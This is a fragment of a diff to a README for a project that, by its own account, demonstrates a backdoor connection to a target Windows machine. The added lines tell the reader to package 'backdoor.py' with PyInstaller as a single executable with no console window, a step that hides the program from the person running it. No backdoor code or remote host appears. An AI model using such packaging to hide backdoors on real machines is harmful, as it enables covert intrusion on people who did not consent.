@@ -26,3 +26,5 @@ This project demonstrates a simple backdoor connection between a target **Window
   ```bash
   pip install pyinstaller
 
+##🛠️ Setup Instructions
+-pyinstaller backdoor.py --onefile --noconsole
